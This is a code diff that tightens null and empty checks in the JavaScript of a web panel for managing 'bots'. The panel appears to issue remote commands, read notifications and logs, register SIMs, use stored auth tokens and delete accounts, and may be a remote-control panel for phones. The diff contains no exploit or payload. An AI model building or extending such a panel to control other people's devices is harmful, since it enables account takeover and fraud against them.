@@ -316,7 +316,7 @@ function fmtLogAge(s){
   return Math.floor(diff/3600)+'h ago';
 }
 async function loadLogs(showNotif){
-  if(!selected) return;
+  if(selected===null || selected===undefined || selected==='') return;
   try{
     const r=await fetch('api/state.php?bot_id='+selected, {headers: HEADERS});
     const j=await r.json();
@@ -333,7 +333,7 @@ async function loadLogs(showNotif){
   }catch(e){ const m='<div class="muted">load '+esc(e.message)+'</div>'; const a=document.getElementById('logs'); if(a) a.innerHTML=m; const b=document.getElementById('liveLogs'); if(b) b.innerHTML=m; }
 }
 async function loadNotifications(){
-  if(!selected) return alert('Select a bot');
+  if(selected===null || selected===undefined || selected==='') return alert('Select a bot');
   document.getElementById('logs').style.display='none';
   document.getElementById('notifs').style.display='block';
   try{
@@ -356,12 +356,12 @@ async function sendLogout(){
   await sendCommand(bot_id, 'LOGOUT', {wait});
 }
 async function sendLogoutLive(){
-  if(!selected) return alert('Select a bot');
+  if(selected===null || selected===undefined || selected==='') return alert('Select a bot');
   const wait=parseInt(document.getElementById('logoutWaitLive').value||0);
   await sendCommand(selected, 'LOGOUT', {wait});
 }
 async function sendCmd(cmd){
-  if(!selected) return alert('Select a bot');
+  if(selected===null || selected===undefined || selected==='') return alert('Select a bot');
   await sendCommand(selected, cmd, null);
 }
 async function sendCustomCommand(){
@@ -436,8 +436,8 @@ function getSelectedBotId(){
   if(cb) return cb.getAttribute('data-bot');
   const sel = document.getElementById('simBotSelect');
   if(sel && sel.value) return sel.value;
-  if(selected) return selected;
-  return bots[0]?.id || null;
+  if(selected!==null && selected!==undefined && selected!=='') return selected;
+  return bots[0]?.id ?? null;
 }
 async function loadDevicesAndTokens(){
   const btn = document.getElementById('btnLoadTokens');
@@ -461,7 +461,7 @@ async function loadDevicesAndTokens(){
 }
 function openSimRegisterFlow(){
   const bid = getSelectedBotId();
-  if(!bid) return alert('Select device');
+  if(bid===null || bid===undefined || bid==='') return alert('Select device');
   document.getElementById('simMappingArea').style.display = 'block';
   document.getElementById('simBotSelect').value = bid;
   document.getElementById('simFetchStatus').textContent = 'Ready — Fetch';
@@ -469,7 +469,7 @@ function openSimRegisterFlow(){
 }
 async function fetchSimsAndPackages(){
   const bid = document.getElementById('simBotSelect').value;
-  if(!bid) return alert('Select device');
+  if(bid===null || bid===undefined || bid==='') return alert('Select device');
   const status = document.getElementById('simFetchStatus');
   const wrap = document.getElementById('simMappingTableWrap');
   const btnReg = document.getElementById('btnRegisterSims');
@@ -494,7 +494,7 @@ async function fetchSimsAndPackages(){
 }
 async function registerSims(){
   const bid = document.getElementById('simBotSelect').value;
-  if(!bid) return alert('Select device');
+  if(bid===null || bid===undefined || bid==='') return alert('Select device');
   const mappings = [...document.querySelectorAll('#simMappingTableWrap select[data-sim]')].map(s=>({simId: s.getAttribute('data-sim'), packageId: s.value || null}));
   const toRegister = mappings.filter(m=>m.packageId);
   if(!toRegister.length) return alert('Select at least one package');
@@ -510,7 +510,7 @@ async function registerSims(){
 }
 function goToSite(){
   const bid=getSelectedBotId();
-  if(!bid) return alert('Select device checkbox first');
+  if(bid===null || bid===undefined || bid==='') return alert('Select device checkbox first');
   const bot=bots.find(b=>String(b.id)===String(bid));
   const token=bot?.auth_token||'';
   if(token){
@@ -528,7 +528,7 @@ function goToSite(){
 }
 function openCallStatus(){
   const bid=getSelectedBotId();
-  if(!bid) return alert('Select a device (checkbox) in Devices');
+  if(bid===null || bid===undefined || bid==='') return alert('Select a device (checkbox) in Devices');
   document.getElementById('csBotId').textContent=bid;
   document.getElementById('csUpdated').textContent='';
   document.getElementById('csBody').innerHTML='<div class="muted">Loading…</div>';
@@ -537,7 +537,7 @@ function openCallStatus(){
 }
 function closeCallStatus(){ document.getElementById('callStatusOverlay').style.display='none'; }
 async function refreshCallStatus(){
-  const bid=getSelectedBotId()||selected; if(!bid) return;
+  const bid=getSelectedBotId() ?? selected; if(bid===null || bid===undefined || bid==='') return;
   const body=document.getElementById('csBody'); const upd=document.getElementById('csUpdated');
   try{
     let sims=[], updated=null;
@@ -588,7 +588,7 @@ async function refreshCallStatus(){
 }
 async function deleteAccountNow(){
   const bid = getSelectedBotId();
-  if(!bid) return alert('Select device checkbox first');
+  if(bid===null || bid===undefined || bid==='') return alert('Select device checkbox first');
   // no confirmation per request — direct delete
   if(!confirm('Delete account for bot '+bid+'? This is irreversible.')) return;
   const overlay=document.getElementById('deleteOverlay');
